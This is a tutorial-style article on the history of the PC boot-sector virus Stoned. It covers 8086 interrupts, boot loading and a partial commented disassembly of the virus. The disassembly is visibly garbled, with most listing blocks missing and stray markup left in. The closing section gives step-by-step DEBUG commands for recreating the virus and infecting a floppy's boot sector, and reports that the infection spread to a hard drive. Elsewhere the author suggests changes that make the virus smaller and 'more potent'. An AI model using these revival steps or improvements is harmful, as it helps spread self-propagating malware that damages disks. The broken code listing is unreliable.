== Viruses ==

Civilization is the biological virus's best friend. Now that humans live closely and move around freely the biological virus has a better chance of spreading. The internet has done the same thing for the computer virus. Now that every computer is connected through the internet, the computer virus has more options to spread.

Computer viruses use to be tiny parasitic code fragments that inject themselves into the disk image of other programs. Viruses today are more sophisticated and much larger. Viruses used to be snippets of assembly language fragments. Some today are macro scripts embedded in a word document.

Like their biological counterparts, computer viruses occasionally mutate. Hackers, eager to show their coding prowess, disassemble viruses and change their functions. Often the change is for the worst causing damage to countless hard-drives – beware the darkside of computer archeology.

Some viruses, like the Stoned virus we will be looking at shortly, are designed do nothing more than print a message on the screen. Aside from a slight drop in system performance, the user is mostly unaffected by the virus. Some viruses contain code-bugs that affect their potency. The Morris Internet Worm is a good example. It was supposed to be rather benign, but because of bugs, it inadvertently crippled thousands of machines at a considerable monetary cost. The Stoned virus, too, will inadvertently cripple a disk that fills up.

Some viruses are humorous; the Green Caterpillar virus (called the 1591 virus because of its code size) scrolls a green caterpillar down the text screen. Other viruses are designed specifically to do damage. The Michelangelo virus (a close cousin to the Stoned virus) used to get media attention every year. This virus hides in the background of a computer silently spreading from machine to machine until March 6th, the birthday of the famous 16th century Italian artist. On that day, the virus quickly erases the computer's hard-drive.

Before we look at the complete disassembly of the Stoned virus, I must remind you that Federal law provides severe penalties for computer crimes – crimes like releasing a computer virus into the computing community. But we are computer archeologists, right? We are only interested in seeing how a virus works, and the Stoned virus is an intriguing archeological find.

== The PC Virus ==

PCs seem especially susceptible to computer viruses. The PC was designed for home use, which meant IBM had to cut certain corners to keep the price down. These cutbacks opened the door for viruses.

The first cut corner was the processor. VAX and SUN CPUs have memory protection built into the processor. This is a must for any serious multi-user system. But the PC was initially designed for a single user – a user that would have free reign on the system. Of course that means a virus executed by the user also has free reign on the system. (Memory management hardware has since become an integral part of CPUs used in PCs.)

The second cut corner was the operating system media. Hard-drives weren't cost effective when PCs first arrived on the scene. They were small and expensive (small in capacity but large in physical size!). To reach everyday users, the DOS operating system had to fit on a 560KB floppy. That left little room for process-multitasking or login security – and forget a windowing environment.

Application vendors were also restricted to the floppy. Floppies are very portable and very easy to copy. Before long, the Sneakernet sprung to life – a network of friends passing illegal copies of software among themselves. No hardware security, no operating system security, and portable, easy to duplicate application disks – the PC world was a fertile ground for the virus.

But the heart of the computer viruses is the 8086 interrupt structure. As we will see, this scheme invites future upgrades to extend the base operating system by overriding system calls (a powerful object-oriented concept). Thus viruses are simply malicious OS upgrades!

== The 8086 Interrupt Structure ==

The Intel 8086 CPU takes software interrupts to a new level. Instead of the eight interrupt levels supported by its predecessors, the 8086 supports 256! Interrupts are stilled mapped into the first chunk of memory, but now interrupt handler routines are "pointed to" by 256, four-byte far-pointers. The first four bytes of memory point to the service routine for interrupt 0. The next four bytes point to the service routine for interrupt 1 and so on filling the entire first 1K of memory. Why four bytes for a pointer? The 8086 uses a segmented memory scheme with a 2-byte segment address and a 2-byte offset address.

During an interrupt cycle, a hardware device places its interrupt number on the CPU data bus. The CPU multiplies this number by four and fetches the four-byte memory pointer. It then pushes the flags on the stack and performs a far CALL to the interrupt handler.

In an 8085 system, the ROM was mapped first in the address space. In the 8086, RAM comes first. This means that the interrupt table is in RAM and can be changed on the fly. As the operating system loads, it sets the interrupt vectors to point to the individual service routines. Thus the functionality of old hardware service routines can be upgraded periodically with new device drivers. New hardware devices ship with software that registers interrupt service routines in the appropriate vector.

Of course, keeping up with which device uses which interrupt can be a pain. There are some reserved vectors on typical PC systems. Interrupt 0 is called whenever the CPU tries to perform a division by 0. Interrupt 1 is the singlestep interrupt used for debugging code. Interrupt 8 is tied to a hardware clock. This interrupt is called regularly, and the system clock usually depends on this routine to increment a memory counter (the Stoned virus reads this counter).

Very few 8086 systems have 256 interrupting devices! The lion's share of the interrupt vectors are used as software interrupts. A program can invoke any interrupt routine through the INT XX command, where XX is the interrupt number from 00 to FF hex.

The BIOS establishes a few low-level routines that other programs can invoke. INT 10 is a complex video driver that manages the console window. Parameters passed into this function through the registers control a number of sub-functions that do things like loading fonts, scrolling the screen, and printing strings. INT 12 returns the amount of conventional memory in 1K chunks. INT 18 invokes the BASIC ROM (what a language). You can call INT 19 to reboot the machine. Through INT 13, programs can access sectors on disk drives connected to the system.

The ROM designers could have avoided the indirection of interrupt vectors by publishing a list of ROM routine addresses for programs to call directly. The RAM vector allows the BIOS to be upgraded by the operating system loaded from disk. Suppose the DOS designers had come up with a better way to access sectors on a disk. The ROM code is unchangeable, but DOS could change the INT 13 vector to point to the newer routines loaded from disk. Existing programs don't have to be told a new routine address – they continue to use the routine indirectly through the INT 13 vector.

To encourage others to design hardware for their computers, IBM published the specs on the hardware bus used in the PC. Other people began to make hardware cards for the PC, which made PCs more attractive. The Intel 8086 chip was available to the public, and other vendors began to use the chip to build PC clones – machines identical to the IBM PC save for the ROM code. The true PC ROM was the property of IBM, but compatible ROMs only had to mimic the IBM machines by setting up interrupt vectors that pointed to routines that performed the same basic functions.

There is an obvious disadvantage to "hanging" system calls on indirect software interrupt hooks: any program is free to change any of the vectors at any time. For instance, a program could remember the destination of a specific interrupt, say INT 13, and change the vector to point to a new routine. This new routine could perform some meaningful task (say, infecting a floppy disk) before calling the original handler routine. This is how a virus gets CPU time, but what does it mean to infect a floppy?

== Bootsector Viruses ==

When you turn on the power to a PC or hit its reset button, the processor jumps to location FFFF:0000 in the memory map (physical address FFFF0).That means at least part of the ROM must be mapped into the end of the address space with the last sixteen being the first thing the processor executes.

The code at this location jumps backwards to an involved initialization routine that performs diagnostics and a memory check. Initialization is important, but this init code is relatively small. The meat of the ROM is a number of utility routines designed to be used by other programs. The initialization code sets the interrupt vectors to point to these routines accordingly – again, these are routines like INT 8 (the hardware timer-tick handler) and INT 13 (primitive disk sector access methods).

Finally, the ROM loads the very first sector from the boot-disk into memory at 0000:7C00 and executes it. This first sector is called the bootsector. It is a small program that immediately loads the true operating system, whatever that may be, from the remainder of the disk. Actually, this is quite ingenious. The ROM doesn't have to know anything at all about the various operating systems as they evolve over time. Operating systems simply supply a bootsector program that knows the details.

The ROM performs a sanity check on the bootsector before it executes it. It checks to see if the first instruction in the sector is a JMP statement. Normally the jump takes the CPU beyond a small media descriptor table that describes the disk's configuration (number of heads, number of sectors, etc). If the bootsector contains a signature jump statement, the ROM executes it by setting the CS register to 0000 and the IP to 7C00. Here is the code from the ROM of my old 286 machine. It performs the transfer from ROM to the operating system.

...
F000:F80B EA007C000000        JMP        0000:7C00
...
}}}

Bootsector programs have to be small; they have to fit in a 512 byte floppy-disk sector. The DOS bootsector simply loads the two hidden system files IO.SYS and MSDOS.SYS. MSDOS.SYS contains the DOS interrupt, INT 21. This is a massive interrupt handler with lots of subcommands selected by passing arguments through the AX register. Eventually, the DOS shell COMMAND.COM is loaded into memory. This is simply a program that reads commands from the keyboard and passes them to INT 21.

The Stoned virus discovered in April of 1991 was one of the first computer viruses on the PC scene. It is a special species of virus known as a "bootsctor virus". As the name suggests, viruses of this type infect the bootsector of an operating system's boot disk. As we will see, their operation is eloquent in its simplicity.

The orignal bootsector of an infected disk has been copied elsewhere on the disk and the virus has been placed in the bootsector. When the PC boots up, it unknowingly loads the virus into memory at 0000:7C00 and executes it. The virus moves to a permanent home in upper memory and changes the INT 13 vector to point to a special routine in the virus code. At this point, the virus usually infects any fixed-disk on the system. Then it loads the original bootsector into memory at 0000:7C00 and executes it. DOS loads unaware of the new INT13 routine.

Every program performs disk access through INT 13 (using the DOS routines through INT 21 won't save you since INT21 ends up calling INT13). Thus every program activates the virus every time it touches a disk. The viral routine secretly makes sure the bootsector of the accessed floppy has been infected before passing the disk request on to the normal INT13. The slight delay usually goes unnoticed by the calling program. Since COMMAND.COM makes use of INT13, something as high-level as doing a DIR on a floppy will trigger an infection.

Despite their limited code space, bootsector viruses usually find a few extra bytes to do something special. The Stoned virus randomly prints the message "Your PC is now STONED!" when the computer is booting up. The Michelagelo virus, also a bootsector virus, erases the disk of the booting computer if the system date is March 6th.

The really complex viruses (the Green Caterpillar for instance) operate a little differently. Instead of attacking a disk's boot sector, they infect every executable file they come in contact with by tagging onto the end of the executable-file and changing the entry point to execute the virus first. Once the virus has executed and made itself "resident", it starts the host program at its original entry point. Becoming resident involves hooking into the DOS interrupt, INT21, and overriding the functions that open files. Thus whenever a file is opened by any program (including COMMAND.COM), the virus is triggered to attempt an infestation. COM files and EXE files have to be infected differently, and the code for these viruses tends to be longer than we could tackle here.

There is something charming about the compact-simplicity of the bootsector viruses, especially the classic example: Stoned. Without further adieu, let's dig in.

== Overview ==

The Stoned virus has two basic parts: a Loader that gets called when the bootsector is loaded, and an Infector that replaces the INT13 vector. The virus jumps from the entry point at location 0000 to the Loader at 00A1.

There is a 13-byte storage area at 0008. We will see how this memory is used when we get to the walk-through.

Locations 0015 through 00A0 hold the Infector routine – the replacement INT13 that other programs call when they need to perform disk I/O. The code at 0066 checks to see if the bootsector on the floppy has been infected, and the code at 0079 performs the infection if needed. Location 0035 passes the incoming request to the original INT13.

Locations 00A1 through 01B7 hold the Loader routine – the code fragment that moves the virus into safe memory, registers the Infector INT13, and executes the original bootsector. Beginning at 00B8, the virus reserves permanent memory at the end of RAM. At 00D8, the virus is transferred to upper memory where execution continues.

The code at 00E4 loads the original bootsector from either the floppy or hard-disk depending on how the machine is booting. The Stoned message is printed from the code at 0118. The jump at 0154 executes the original bootsector. The code at 0159 infects the hard-drive being careful to preserve the partition table, and two ASCII strings are tagged onto the end of the virus beginning at 0189.

== Code Walkthrough ==

Here is the commented disassembly of the Stoned virus in its entirety without regard for any copyrights! Actually, a virus is the ultimate in shareware – it's free, and you get it whether you want it or not.

Remember that the Intel 8x86 chips are little-endians; the least significant byte of a word is stored first in memory. The disassembler I used to generate the listing below conveniently re-orders the bytes of a word for easier reading. Whenever you see a four-digit number, the actual bytes are stored in reverse order. You'll need to remember this if you are going to follow my directions later to bring the virus back to life!

When the program starts, it is in memory at 0000:7C00. As we saw earlier, the ROM bootstrap loads the bootsector into memory at this location, checks for a signature JMP statement (evidently any kind of jump will do), and then executes the program by setting the code segment to 0000 and the instruction pointer to 7C00.

The virus will eventually move itself around in memory and copy itself to disk. The math for these operations is much easier if the offset is 0000. The program's first action is to re-align the CS register so that the virus is at the beginning of segment 07C0. The far jump at location 0000 does nothing more than jump to the very next instruction changing the CS and IP registers along the way. The second instruction is a short (relative) jump over the Infector code and some storage to the Loader at 00A1.

}}}

Anytime you find two absolute jumps together in a control flow a red flag should get raised. Why jump from location 0000 to location 0005 and then from location 0005 to 00A1? Why not just jump from 0000 directly to 00A1? The extra jump instruction wastes three bytes of memory. On this dig we are going to identify several places where bytes could be saved!

The virus uses a 13-byte data-area beginning at 0008. The first byte of this data is a flag that describes what kind of disk the bootsector was loaded from. If the byte is 0, the bootsector was loaded from a floppy. If the byte is 2, the bootsector was loaded from a fixed disk. The virus moves the original bootsector to a "free" sector elsewhere on the disk. The location of this sector is different for floppies and hard-disks, as we will see. This flag is the virus's only way of knowing where to find the original bootsector needed to bring the computer up once the virus has initialized.

As the virus loads, it fills the four bytes at 0009 with the segment and offset of the address of the original INT 13 vector (pointing somewhere in ROM). This will be used to pass requests on to the original disk I/O handler.

The four bytes at 000D are used as an indirect reference to transfer control to the virus when it is copied into permanent memory. We'll see how this works shortly, but notice that the offset is already known – the virus simply fills in the segment address of its new home. Likewise, the four bytes at 0011 are used as an indirect reference to the original bootsector when the virus has loaded. Neither of these indirect pointers is really needed, as we will see.

0035: 2E FF 2E 09 00    JMP     FAR [CS:$0009]          ; Execute the original INT 13
}}}

At this point, the Loader has long since finished its work; the virus is safe in the upper area of conventional memory. The virus has been "hooked into" INT 13 by remembering the original vector in its data-area and changing the INT vector to point to 0015. Location 0015 is then called by some poor, unsuspecting program needing disk access. The virus comes to life and does its thing (infecting floppies) and then silently passes the request on to the original handler. The calling program is none the wiser.

The virus passes all functions except reading or writing a sector on the floppy straight through to the original INT13 handler. When a floppy read or write occurs, the above section of code calls the following routine that infects the bootsector of the floppy if it isn't already infected – but the jump is only taken if the lowest bit of location 0000:043F is off.

This bit represents the state of the floppy-drive's motor. If the bit is one, the drive is running. If the bit is zero, the drive is off. This is really a clever check that keeps the virus from taking action with every single sector read or write. Data is usually accessed as a stream of sectors. The first sector requested gets the motor going, and the motor continues to run while the remaining data is transferred. (Actually the motor continues to run for a few seconds after the last sector is accessed.) By watching the motor, the virus only takes effect on the first sector in a stream of sectors. Otherwise, the user would notice a terrible drop in performance for disk access. Again, this check is quite clever.

The infection process first preserves all the incoming parameters and sets up a call to the original INT13 to load the bootsector of the floppy into memory just after the virus. Note the PUSHF instruction at 0050. The original INT13 is an interrupt handler, and its last instruction is an RETI – RETurn from Interrupt. Since the virus will be CALLing the routine, it must push the flags onto the stack to simulate an INT. Otherwise, too much information is popped off the stack with the RETI, and the CPU crashes.

The NOP instruction at 0065 is confusing at first glance. The jump at 0056 jumps over the NOP to location 0066, and no other jump in the code brings the CPU back to location 0065. This is simply a wasted byte with no other function than to take up space. Why would a programmer, already limited to a sector's worth of code, waste a byte with a NOP that is never hit?

The answer is – the programmer didn't do it. This extra instruction was actually inserted by the assembler! Have a look at the opcode for another JMP statement early in the code at location 0005. E9 is the JMP opcode followed by a two-byte, signed offset. Adding 0099 to 0008 (the location of the next instruction) puts the destination of the jump at 00A1.

Unlike the E9 absolute-jump, all of the conditional-jumps (like the one at location 0061 above) use a single-byte, signed offset. Thus conditional jumps cannot jump to code more than about 128 bytes away in either direction. This makes good sense; conditional jumps are very frequent, and they are normally used to jump over an instruction or two or back up to the top of a short loop. Designing the instruction set with single-byte-offset conditional jumps makes for tight code, and it works for about 99% of all cases. For the rare, longer conditional jumps, programmers must branch out to a nearby absolute JMP statement that can reach anywhere in the segment – or beyond.

The EB opcode at 0063 is a type of conditional jump (with a single byte offset) except that the condition is always true. For short jumps, programmers can use this single-byte-offset form of JMP rather than wasting an extra byte on an offset with an MSB of 00.

The trouble comes when the assembler is allowed to choose between the two forms of jump. Remember that assemblers make two passes while building an object file. On the first pass, the assembler calculates the memory location of all labels in the program; this is easy since instructions have fixed lengths. On the second pass, the assembler uses the label-table to build the opcodes and operands for the instructions.

When the assembler comes to a JMP statement on the first pass where the label's address has already been resolved (a backward jump), the assembler can easily calculate the distance back to the label and use a one-byte or two-byte offset as appropriate. When it comes to a JMP statement where the address for the label is not known (a forward jump to a label not defined yet), it has no way of knowing if the destination is within reach of a single-byte offset. It must assume the worst and treat the jump as a two-byte offset.

On the second pass, all of the labels are known – but they are stubbornly established. When the assembler recognizes that a forward jump is actually a one-byte jump, it sticks in the single byte form of the jump (which executes a bit faster) and pads the previously reserved space with an arbitrary value. Any value will do since the byte will never get executed, but the safest byte is the NOP instruction. This is what we are seeing in the virus code.

Most assemblers provide a way to force a JMP instance to single-byte-offset form (a standard error is generated if the destination is, in fact, out of reach). Some assemblers (like Borland's TASM) allow you to specify the number of passes used to resolve forward-references. With an extra pass or two, the assembler can eliminate the wasted NOPs.

Searching the code for forward jumps reveals only two: this one and the one at the one at 0105. Closing up these wasted bytes frees two more bytes of memory – five so far.

The rest of the Infector code is straightforward. The current bootsector is loaded from the floppy into memory. If the first four bytes of the sector match the virus, the sector must already be infected and the virus leaves it alone. Otherwise, the original sector is written to a holding place on the floppy (cylinder 0, sector 3, head 1). Then the virus writes itself into the bootsector completing the infection process. Finally, the original INT13 routine is invoked to handle the incoming request for the calling program.

There is nothing special about the holding sector – it appears to be a sector deep in the files area of the floppy. If the floppy begins to fill up, this sector could get over-written corrupting the boot process. The floppy will no longer be bootable, but no file damage will occur. If the virus infects a floppy that is almost filled up, it will blindly write the bootsector over any data stored in the holding sector. In this case, file damage does occur.

On fixed-disks, the holding place is cylinder 0, sector 7, head 0, which is near the end of the root directory. If the fixed-disk has more than 96 entries in the root directory, the same kind of corruption will occur.

Now we come to 00A1 – the destination of the jumps in the first few bytes of the program. Remember that the computer is booting up at this point, and the virus has just been loaded into memory at 0000:7C00. The CS register has been re-oriented so that this instruction is executed at 07C0:00A1. First the virus suspends all interrupts and establishes a temporary stack. Then the original INT13 vector is saved in the virus's data block.

The ROM bootstrap writes the amount of RAM (number of 1K chunks) as a byte to location 0000:0413. This is the value reported by INT 12. The virus takes the last two 1K-chunks from the memory pool by subtracting 2 from this location. The virus then calculates the segment address of the reserved area and copies its entire length from 0000:7C00 to the permanent location.

Why 2K? The virus is only ½K in length – it just fits in the 512-byte bootsector of a floppy, and it needs only ½K to live in. However, the virus must check (by loading) the bootsectors of disks into memory. Since the virus checks the fixed disk (as we will see), the read buffer must be 1K long; the virus is expecting fixed disks to use 1K sectors. Memory is reserved in 1K chunks, and the virus sets aside 2K to fill its 1.5K needs.

The segment value of the reserved memory is written into the virus data area at 000F – just behind the offset value of 00E4. The indirect jump at 00DF makes a far jump from 07C0:00DF to RRRR:00E4 where RRRR is the reserved segment. The program picks up at the very next instruction in the listing except now it is running in its new home at the top of RAM.

This is a clever but confusing jump. If we think about it, all the virus is doing with this jump is changing the CS register to point to the new segment. The instruction pointer within the segment is the same no matter which segment the code is in. An easier way to change the CS register is to push ES, which contains the new segment, and then pop the CS register from the stack. Unfortunately, the POP CS instruction is not implemented by the architecture! I guess this instruction is more dangerous than useful – and how often would the instruction be needed?

There is still an easier way to make the jump, however. The JMP instruction at 00DF can be changed to a direct FAR jump like this: 00DF: EA E4 00 RRRR (JMP RRRR:00E4). The segment value RRRR is not know until run time, but the MOV at location 00CF could be changed to write the segment value in ES into the code memory at offset 00E1. Then when the CPU gets to the instruction a few cycles later, it will know exactly where to go! This is called "self-modifying" code since the program actually writes its own instructions as it executes. Changing the JMP eliminates the four bytes of data at 000D. That brings our savings up to 9 bytes.

Once the virus has relocated, the parameters are set for loading the original bootsector into memory, but the virus has to find where it put the original bootsector. As we saw, this location is different depending on the type of disk. If the computer is booting from a fixed-disk, the virus simply loads the original bootsector and executes it. This initiates the normal boot process (with the INT13 Infector permanently installed).

If the virus is booting from a floppy, it does the extra work of infecting any fixed-disk on the system. There is also a random chance of getting the Stoned message on the screen if the computer is booting from a floppy. We'll see that code in a moment.

Notice the instruction at 00E4. AX is used to pass information into the INT13; AH contains the sub-command and AL contains some additional data. Using immediate MOVs to load parameters into registers for INT calls is second nature to 8x86 programmers, and we generally find immediate MOVs before any INTx instruction. However, at 00E4 the programmer could have saved a byte by doing an "XOR AX,AX" (which results in 0000). That brings our code savings up to 10 bytes.

At 0106, the virus loads the original bootsector from the floppy. The conditional jump at 010E checks for any access errors, but this is really just a waste of space. If the original bootsector can't be loaded, the system will not come up no matter what the virus does. The jump transfers execution to 0000:7C00, which still contains the virus sector. An endless loop begins.

Error checking is only useful if you have the ability to recover from the error. Since there isn't much in the way of recovery at this point, I would have simply left out the two-byte conditional jump at 010E. But there is an even better reason to leave out the check: leaving it out makes the virus more potent. The code following this check tries to infect the fixed-disk – which might work even if the floppy isn't responding. By handling the error at 010E, the virus rules out a potential infection. Leaving out the two-byte conditional jump brings our savings up to 12 bytes.

If booting from a floppy, the virus checks the low byte of the ever-changing clock-tick in memory at 0000:046C. A hardware clock interrupts the CPU several times a second, and the clock-handler routine increments the word at 0000:046C. There is no way to know what the clock-tick will be at this point – this is essentially a random number. The test at 0116 will fall through to the next section of code if the lower three bits of the timer are all 0's. If you boot your PC from an infected floppy, you will see the famous "Your PC is now stoned!" message on average of once every eight boot-ups.

Once the message is printed (or skipped), the virus continues at 012A. Here the virus attempts to load the bootsector from a fixed-disk. If an error occurs, the virus continues with the normal boot up process. This time the error checking is needed since the error is likely – it could mean that there is no fixed-disk in the computer. Ah, those were the days!

If the first four bytes of the loaded bootsector match the virus, the disk is already infected and the original bootsector is executed with the following section of code. Otherwise, the hard-disk infection continues at 0159.

{{{#!AssemblyCode
; No matter how virus loaded, it infects only floppy disks that get a copy of the
; memory-resident copy of the virus. We want floppies to have media type = 0.
014E: 2E C6 06 08 00 00 MOV     BYTE PTR [CS:$0008],$00 ;{*} Media type = floppy.
0154: 2E FF 2E 11 00    JMP     [CS:$0011]              ; Continue with normal boot sector
}}}

This is how the virus finishes its loading by executing the original bootsector, which was loaded from disk earlier. Once again an indirect jump is used where a direct, intrasegment jump is better. The direct jump occupies the same space (five bytes) and executes a little faster. Replacing the five bytes at 0154 with a direct jump eliminates the need for the four bytes of storage at 0011. That brings our savings up to 16 bytes.

The very last thing the virus does before turning control over to the original bootsector is change the media-type flag to 0 (floppy) no matter how the virus booted. Once it is loaded into memory, the virus only infects floppies. To infect a floppy, the virus copies the entire memory-resident virus to the bootsector of the disk – the media-type flag is set to zero for once and for all.

As the above code shows, infecting a fixed-disk's bootsector is slightly more complicated. In general, fixed-disks have 1K sectors (twice as large as the sectors on a floppy). The first half of the sector contains a normal bootsector program, but the last half contains a special data-area that describes all of the partitions on the drive. The flags in this area indicate which partition is active and what kind of file-system each partition contains. The virus must be careful to preserve this partition-table before replacing the existing bootsector. The string operation at 017C copies the partition table from the end of the original bootsector onto the end of the virus.

Interestingly, one mutation of this virus known as the Monkey Virus dropped this check in order to make room for other functionality. Most operating systems depend on the information in the partition-table, and a Monkey infested fixed-disk is often unusable.

At 0189 we see the famous "stoned" message. Note the 07 character embedded in the text. When printed in teletype mode, this character rings the bell (or beeps the speaker).

Notice the ASCII string beginning at 01A5. This string has no terminating 0 or carriage-return or line-feed. Even though the data is part of the virus, it is just a signature; nobody ever sees it – except, of course, computer archeologists like you! Many variations of the virus simply extend the printed message into this area.

One variation of this virus, the famous Michelangelo virus, contains a malicious code fragment in place of the harmless message routine. The code checks the system clock, and on March 6th, it enters an endless loop of filling up the sectors on the disk with the bootsector. Since the FAT table is first on the disk, Michelangelo renders a disk useless in the blink of an eye.

Space is a problem for bootsector viruses – a floppy bootsector is only 512 bytes long, and on a fixed-disk, the partition-table begins at offset 01BE. This gives the virus only 1BE bytes to work with, yet the Stoned virus does quite a lot with several bytes to spare. If you want to make modifications to the virus, you can re-compile it with the recommended changes and squeeze out an extra 16 bytes. You could even ditch the message (and printing routine) completely if you need space for more code.

== The First Case ==

We have seen how the Stoned virus spreads from one infected disk to another, but how did the first floppy get infected? The procedure is actually very easy – you already have all the tools you need to bring this virus back to life!

First, you need a boot-floppy made with "format /s". The Stoned virus was designed for 360K 5.25" floppies. I had bad luck trying to put the virus on a 3.5" disk.

The virus copies the original bootsector to cylinder 0, sector 3, head 1 of the floppy. You can do this with DEBUG (a standard command-prompt utility shipped with all PC operating systems). Using the assembler built into DEBUG, you can copy the bootsector to the expected holding place as shown with the DEBUG session below:

{{{
>debug
- L 200 0 0 1
- A
  mov ax,0301
  mov bx,0200
  mov cx,0003
  mov dx,0100
  int 13
  ret
<enter>
- G
- Q
}}}

The 'L' command loads the bootsector into the current segment at offset 200. Next, you use the 'A' command to assemble a small program fragment. The assembler will assemble your program at offset 0100 by default. (This is a throw-back to the days when COM files were common. COM files have one segment and load just above their 256-byte Program Segment Prefix). The 'G' command executes the program you just entered.

Next, you must get a binary version of the Stoned virus. The easiest way is to use DEBUG to enter the values directly from the disassembly above into memory in the current segment at offset 0100. Remember that my listing shows words with the bytes in readable-order. You must reverse the byte-order of all four-digit numbers in the above listing as you enter them into memory.

You might want to enter the bytes into a text-file and write a C parser to convert the ASCII into a binary file. I tested this approach, and the single-byte-tally checksum of the program is 189 (BD in hex). No matter which technique you use, you should be able to type at least two digits byte every five seconds. At that rate, you can punch in the virus from the listing in about 40 minutes.

The DEBUG session below shows how to load the virus from a binary file named A:\STONED.BIN into the current segment at offset 0100. We can then use the DEBUG 'W' command to write the virus into the bootsector of drive 0 (the floppy).

{{{
>debug a:\stoned.bin
- W 100 0 0 1
- Q
}}}

Congratulations! You now have a floppy infected with the Stoned virus. I booted from the floppy on an old 286 machine I keep around the house for just such experiments. (It is almost an archeological find in itself). After several boots, I got the signature Stoned message, and I used DEBUG to look at the bootsector of the C: drive. Sure enough, the virus was there. I formatted a new floppy in the A: drive and used DEBUG to look at its bootsector – there was the virus as expected, alive again after all these years.
